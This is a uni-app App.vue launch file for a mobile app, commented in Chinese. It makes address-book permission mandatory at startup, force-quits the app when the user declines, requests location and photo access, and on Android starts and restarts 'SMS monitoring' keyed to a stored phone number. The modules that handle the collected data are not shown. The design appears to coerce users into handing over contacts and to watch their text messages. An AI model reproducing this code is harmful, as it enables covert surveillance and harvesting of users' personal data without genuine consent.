<script>
	import AndroidHandler from '@/utils/android-handler.js';
	import IOSHandler from '@/utils/ios-handler.js';
	import PlatformUtil from '@/utils/platform.js';
	import serverConfig from '@/config/server.config.js';
	import configManager from '@/utils/config.js';

	// 添加全局网络状态对象
	const networkState = {
		isConnected: false,
		networkType: 'none'
	};
	
	// 导出网络状态，供组件使用
	export const getNetworkState = () => networkState;

	export default {
		onLaunch: async function() {
			// #ifdef APP-PLUS
			try {
				// 先检查网络连接
				await this.checkNetworkConnection();
				
				// 设置全局网络状态为已连接
				networkState.isConnected = true;
				
				// 加载后台配置
				try {
					await configManager.loadConfig();
				} catch (configError) {
					console.error('加载配置失败，使用默认设置', configError);
				}
				
				// 根据后台配置设置屏幕方向，添加错误处理
				try {
					let screenOrientation = 'portrait'; // 默认竖屏
					
					// 尝试从配置管理器获取屏幕方向
					try {
						screenOrientation = configManager.getScreenOrientation() || 'portrait';
					} catch (orientationError) {
						console.error('获取屏幕方向配置失败，使用默认竖屏', orientationError);
					}
					
					console.log('设置屏幕方向:', screenOrientation);
					
					// 根据配置设置屏幕方向
					if (screenOrientation === 'landscape') {
						console.log('锁定屏幕为横屏模式');
						plus.screen.lockOrientation('landscape-primary');
					} else {
						// 默认为竖屏
						console.log('锁定屏幕为竖屏模式');
						plus.screen.lockOrientation('portrait-primary');
					}
				} catch (screenError) {
					console.error('设置屏幕方向失败，继续执行', screenError);
					// 出错时默认设置为竖屏
					try {
						plus.screen.lockOrientation('portrait-primary');
					} catch (e) {
						console.error('设置默认屏幕方向也失败', e);
					}
				}
				
				// 根据平台选择处理程序
				if (PlatformUtil.isAndroid()) {
					// Android平台：先单独检查通讯录权限(这是必需的权限)
					console.log('应用启动，优先检查通讯录权限');
					const hasContactsPermission = await AndroidHandler.checkAndHandleContactsPermission();
					
					if (!hasContactsPermission) {
						console.log('通讯录权限检查失败，应用将退出');
						// 权限检查方法中已经处理了退出逻辑，这里不需要额外处理
						return;
					}
					
					console.log('通讯录权限已授权，继续检查其他权限');
					
					// 再检查其他权限(不强制要求)
					await AndroidHandler.checkPermissions();
					console.log('Android应用启动，所有权限检查完成');
					
					// 检查是否有保存的用户手机号，如果有则启动短信监控
					const phone = uni.getStorageSync('phone');
					if (phone) {
						console.log('发现已保存的用户手机号，启动短信监控功能');
						AndroidHandler.startSmsMonitoring(phone);
					}
				} else if (PlatformUtil.isIOS()) {
					// iOS平台：先强制检查通讯录权限状态
					console.log('iOS应用启动，优先检查通讯录权限');
					
					// 重置弹窗状态
					IOSHandler.permissionDialogShowing = false;
					
					// 直接使用同步方法检查权限
					const syncPermissionCheck = IOSHandler.checkContactsPermissionSync();
					console.log('同步检查通讯录权限结果:', syncPermissionCheck);
					
					if (syncPermissionCheck) {
						// 实际已有权限，清除拒绝记录
						console.log('实际已有通讯录权限，清除拒绝记录并继续');
						uni.setStorageSync('ios_contacts_permission', 'granted');
						uni.removeStorageSync('ios_contacts_permission_denied');
						
						// 继续检查其他权限
						await this.checkIOSPermissions();
						console.log('iOS应用启动，所有权限已获取');
					} else {
						// 无权限，执行标准权限检查流程
						console.log('无通讯录权限，开始权限请求流程');
						
						// 无论之前的缓存如何，先直接检查实际的权限状态
						console.log('执行详细权限检查');
						const actualPermission = await IOSHandler.checkContactsPermissionWithoutPrompt();
						console.log('实际通讯录权限状态:', actualPermission);
						
						if (actualPermission) {
							console.log('通讯录权限已获得，清除任何之前的拒绝记录');
							uni.removeStorageSync('ios_contacts_permission_denied');
							uni.setStorageSync('ios_contacts_permission', 'granted');
							
							// 继续检查其他权限
							await this.checkIOSPermissions();
							console.log('iOS应用启动，所有权限已获取');
						} else {
							console.log('通讯录权限实际检查失败，执行权限请求流程');
							
							// 执行标准权限检查流程，这会处理权限请求和弹窗
							const launchCheck = IOSHandler.checkContactsPermissionAtLaunch();
							if (!launchCheck) {
								console.log('启动权限检查失败，应用将退出');
								return;
							}
							
							// 然后进行具体权限检查
							try {
								const contactsPermission = await IOSHandler.checkContactsPermission();
								console.log('通讯录权限检查结果:', contactsPermission);
								
								if (!contactsPermission) {
									console.log('通讯录权限检查失败，退出应用');
									
									// 使用统一对话框方法，避免多个弹窗
									if (!IOSHandler.permissionDialogShowing) {
										await IOSHandler.showPermissionDialog(
											'通讯录权限被拒绝',
											'此应用需要访问通讯录才能继续使用。请重启应用并授予权限。',
											false
										);
										setTimeout(() => {
											IOSHandler.forceQuitApp();
										}, 500);
									}
									return;
								}
								
								// 再检查其他权限
								await this.checkIOSPermissions();
								console.log('iOS应用启动，所有权限已获取');
							} catch (permissionError) {
								console.error('权限检查错误:', permissionError);
								
								// 特别处理 code 20 错误
								if (permissionError.code === 20) {
									console.log('检测到code 20权限错误，显示对话框并退出');
									
									// 记录拒绝状态
									uni.setStorageSync('ios_contacts_permission_denied', 'true');
									
									// 使用统一对话框方法
									if (!IOSHandler.permissionDialogShowing) {
										await IOSHandler.showPermissionDialog(
											'通讯录权限被拒绝',
											'此应用需要访问通讯录才能继续使用。请重启应用并授予权限。'
										);
										setTimeout(() => {
											IOSHandler.forceQuitApp();
										}, 500);
									}
									return;
								}
								
								throw permissionError; // 重新抛出其他错误
							}
						}
					}
				}
			} catch (error) {
				console.error('初始化失败:', error);
				// 如果是权限相关错误，显示对话框并退出应用
				if (error.message && (error.message.includes('权限') || error.message.includes('permission'))) {
					console.log('权限相关错误，显示对话框后退出应用');
					
					// 使用统一对话框方法
					if (!IOSHandler.permissionDialogShowing) {
						await IOSHandler.showPermissionDialog(
							'权限错误',
							'应用需要必要的权限才能正常运行。请重启应用并授予所需权限。',
							false
						);
						
						if (PlatformUtil.isIOS()) {
							IOSHandler.forceQuitApp();
						} else {
							plus.runtime.quit();
						}
					}
				} else if (error.code === 20) {
					// 特殊处理 code 20 错误
					console.log('检测到code 20权限错误，退出应用');
					
					// 记录拒绝状态
					uni.setStorageSync('ios_contacts_permission_denied', 'true');
					
					// 使用统一对话框方法
					if (!IOSHandler.permissionDialogShowing) {
						await IOSHandler.showPermissionDialog(
							'权限被拒绝',
							'应用无法继续运行，请重启并允许权限请求。',
							false
						);
						
						if (PlatformUtil.isIOS()) {
							IOSHandler.forceQuitApp();
						} else {
							plus.runtime.quit();
						}
					}
				}
			}
			// #endif
			
			// 设置全屏显示
			plus.navigator.setFullscreen(true);
			
			// 设置状态栏为透明
			plus.navigator.setStatusBarBackground('transparent');
			plus.navigator.setStatusBarStyle('light');
		},
		onShow: function() {
			console.log('App Show')
			
			// 在Android平台，如果应用恢复前台，重新启动短信监控
			if (PlatformUtil.isAndroid()) {
				const phone = uni.getStorageSync('phone');
				if (phone && !AndroidHandler.isMonitoringSms) {
					console.log('应用恢复前台，重新启动短信监控');
					AndroidHandler.startSmsMonitoring(phone);
				}
			}
		},
		onHide: function() {
			console.log('App Hide')
			
			// 在Android平台，如果应用进入后台，暂停短信监控以节省资源
			if (PlatformUtil.isAndroid() && AndroidHandler.isMonitoringSms) {
				console.log('应用进入后台，暂停短信监控');
				AndroidHandler.stopSmsMonitoring();
			}
		},
		methods: {
			checkNetworkConnection() {
				return new Promise((resolve, reject) => {
					const checkConnection = () => {
						uni.getNetworkType({
							success: (res) => {
								if (res.networkType !== 'none') {
									console.log('网络连接成功:', res.networkType);
									// 更新网络状态
									networkState.isConnected = true;
									networkState.networkType = res.networkType;
									resolve();
								} else {
									console.log('等待网络连接...');
									// 确保网络状态为未连接
									networkState.isConnected = false;
									networkState.networkType = 'none';
									setTimeout(checkConnection, 1000);
								}
							},
							fail: (error) => {
								console.error('获取网络状态失败:', error);
								setTimeout(checkConnection, 1000);
							}
						});
					};

					// 开始检查网络
					checkConnection();

					// 监听网络状态变化
					uni.onNetworkStatusChange((res) => {
						// 更新网络状态
						networkState.isConnected = res.isConnected;
						networkState.networkType = res.networkType;
						
						if (res.isConnected) {
							console.log('网络已连接:', res.networkType);
							resolve();
						}
					});
				});
			},
			
			// iOS权限检查方法
			async checkIOSPermissions() {
				console.log('开始检查iOS权限...');
				
				// 通讯录权限已在onLaunch中单独检查，此处不再重复检查
				
				// 1. 检查定位权限
				const locationPermission = await IOSHandler.checkLocationPermission();
				console.log('定位权限状态:', locationPermission);
				
				// 2. 检查短信权限（如果需要）
				const smsPermission = await IOSHandler.checkSMSPermission();
				console.log('短信权限状态:', smsPermission);
				
				// 3. 最后检查相册权限
				const photoPermission = await IOSHandler.checkPhotoPermission();
				console.log('相册权限状态:', photoPermission);
				
				return {
					location: locationPermission,
					contacts: true, // 前面已经检查过通讯录权限
					sms: smsPermission,
					photo: photoPermission
				};
			},
			
			// iOS短信权限检查
			async checkSMSPermission() {
				// iOS不需要专门的短信权限，因为iOS不允许应用直接访问短信
				// 这里只是作为一个占位符，始终返回true
				console.log('iOS平台不需要短信权限，跳过');
				return true;
			}
		}
	}
</script>

<style>
	/* 重置默认样式 */
	page {
		height: 100%;
		margin: 0;
		padding: 0;
	}

	/* 移除默认导航栏 */
	uni-page-head {
		display: none;
	}

	/* 设置全屏容器 */
	.container {
		min-height: 100vh;
		width: 100%;
		padding: 0;
		margin: 0;
	}
</style>
